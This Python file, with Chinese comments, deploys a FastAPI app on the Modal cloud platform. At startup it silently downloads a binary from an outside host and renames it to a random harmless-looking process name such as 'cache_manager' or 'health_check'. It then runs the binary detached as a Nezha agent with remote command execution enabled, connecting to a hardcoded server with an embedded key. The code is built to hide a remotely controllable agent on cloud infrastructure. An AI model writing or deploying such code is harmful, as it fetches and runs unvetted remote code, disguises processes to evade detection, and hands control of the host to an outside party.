import os
import time
import subprocess
import platform
import random
import threading
from fastapi import FastAPI, Response
import modal
import psutil  # 用于进程检查

# ========== 定义 Modal 镜像，安装依赖 ==========
image = modal.Image.debian_slim().pip_install(
    "fastapi[standard]",
    "requests",
    "psutil",
)

app = modal.App("nezha-fastapi-app", image=image)
web_app = FastAPI()

# ========== 辅助函数（与之前一致，仅修改 exec_cmd 重定向输出）==========
def create_directory(file_path):
    if not os.path.exists(file_path):
        os.makedirs(file_path)

def get_system_architecture():
    architecture = platform.machine().lower()
    return 'arm' if ('arm' in architecture or 'aarch64' in architecture) else 'amd'

def download_file(file_name, file_url, file_path):
    import requests
    try:
        response = requests.get(file_url, stream=True, timeout=30)
        response.raise_for_status()
        full_path = os.path.join(file_path, file_name)
        with open(full_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return True
    except Exception as e:
        print(f"Download failed: {e}")
        return False

def authorize_files(file_path):
    if os.path.exists(file_path):
        try:
            os.chmod(file_path, 0o775)
        except Exception as e:
            print(f"Chmod failed: {e}")

def exec_cmd(command):
    """执行命令，并将输出重定向到 /tmp/agent.log 以便排查"""
    try:
        with open('/tmp/agent.log', 'a') as f:
            f.write(f"\n[{time.ctime()}] Running: {command}\n")
            subprocess.Popen(
                command,
                shell=True,
                stdout=f,
                stderr=f,
                start_new_session=True  # 使进程脱离父进程，成为守护进程
            )
    except Exception as e:
        print(f"Command execution failed: {e}")

def run_agent(file_path, nezha_server, nezha_port, nezha_key, uuid):
    """运行 Nezha Agent（增加详细日志）"""
    if not nezha_server or not nezha_key:
        print("NEZHA_SERVER or NEZHA_KEY missing, agent not started.")
        return

    architecture = get_system_architecture()
    disguise_names = ['cache_manager', 'session_handler', 'task_worker', 'log_rotator', 'health_check']
    disguise_name = random.choice(disguise_names)

    # 构造下载 URL
    if nezha_port:
        url = "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
    else:
        url = "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"

    print(f"Downloading agent from {url} to {disguise_name}")
    if not download_file(disguise_name, url, file_path):
        print("Download failed, agent not started.")
        return

    agent_path = os.path.join(file_path, disguise_name)
    authorize_files(agent_path)

    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']

    if nezha_port:
        nezha_tls_flag = '--tls' if nezha_port in tls_ports else ''
        command = f"nohup {agent_path} -s {nezha_server}:{nezha_port} -p {nezha_key} {nezha_tls_flag} >/dev/null 2>&1 &"
    else:
        port = nezha_server.split(":")[-1] if ":" in nezha_server else ""
        nezha_tls = "true" if port in tls_ports else "false"
        config_yaml = f"""client_secret: {nezha_key}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 4
server: {nezha_server}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: {nezha_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: {uuid}"""
        config_path = os.path.join(file_path, 'config.yaml')
        with open(config_path, 'w') as f:
            f.write(config_yaml)
        command = f"nohup {agent_path} -c \"{config_path}\" >/dev/null 2>&1 &"

    print(f"Starting agent with command: {command}")
    exec_cmd(command)

# ========== FastAPI 路由 ==========
@web_app.get("/")
async def root():
    # 返回纯文本，避免 JSON 序列化递归问题
    return Response(content="Nezha agent is running in background. Use /status to check process.", media_type="text/plain")

@web_app.get("/health")
async def health():
    return {"status": "healthy"}

@web_app.get("/status")
async def status():
    """检查 agent 进程是否存活（根据进程名匹配）"""
    agent_names = ['cache_manager', 'session_handler', 'task_worker', 'log_rotator', 'health_check']
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            cmdline = ' '.join(proc.info['cmdline'] or [])
            if any(name in cmdline for name in agent_names):
                return {"status": "running", "pid": proc.info['pid'], "cmdline": cmdline[:100]}
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return {"status": "not running", "log_tail": tail_log('/tmp/agent.log')}

def tail_log(filepath, lines=5):
    """返回日志文件最后几行，方便调试"""
    try:
        with open(filepath, 'r') as f:
            return f.read().splitlines()[-lines:]
    except:
        return ["Log file not found or empty"]

# ========== Modal 入口函数 ==========
@app.function()
@modal.fastapi_endpoint(docs=True)
def fastapi_app():
    # 从环境变量读取配置（由 GitHub Actions 传入）
    FILE_PATH = os.environ.get('FILE_PATH', '.cache')
    NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nezha.loc.cc:443')
    NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
    NEZHA_KEY = os.environ.get('NEZHA_KEY', '4z0HWnSGJtKFtKOlfJxSkNC3F8PIJ448')
    UUID = os.environ.get('UUID', '371fea8c-e660-4940-9d95-f314495ab189')

    # 创建缓存目录
    create_directory(FILE_PATH)

    # 在后台线程中启动 Agent（避免阻塞 FastAPI 启动）
    def agent_starter():
        print("Starting Nezha agent in background thread...")
        run_agent(FILE_PATH, NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY, UUID)
        print("Agent start command issued. Process may be running independently.")
        # 可选：监控线程保持运行，定期检查进程（此处省略，避免无限打印）

    thread = threading.Thread(target=agent_starter, daemon=True)
    thread.start()
    print("FastAPI app startup complete, agent thread launched.")

    # 返回 FastAPI 应用实例
    return web_app
